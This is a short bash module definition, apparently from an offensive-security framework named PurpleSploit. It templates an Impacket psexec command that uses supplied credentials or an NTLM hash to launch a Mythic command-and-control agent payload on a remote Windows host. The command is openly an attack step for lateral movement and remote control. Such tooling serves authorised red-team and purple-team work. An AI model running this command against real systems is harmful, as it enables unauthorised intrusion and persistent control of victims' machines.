#!/bin/bash
# Mythic Agent Deployment via PSExec

MODULE_NAME="c2/mythic/deploy_psexec"
MODULE_CATEGORY="c2"
MODULE_DESCRIPTION="Deploy Mythic agent via Impacket PSExec"
MODULE_AUTHOR="PurpleSploit Team"
MODULE_TOOL="impacket-psexec"

REQUIRED_VARS="RHOST,USERNAME,MYTHIC_PAYLOAD"
OPTIONAL_VARS="PASSWORD:,DOMAIN:,HASH:"

COMMAND_TEMPLATE="impacket-psexec \${DOMAIN:+\$DOMAIN/}\${USERNAME}:\${PASSWORD}@\${RHOST} \${HASH:+-hashes :\$HASH} 'cmd /c \${MYTHIC_PAYLOAD}'"
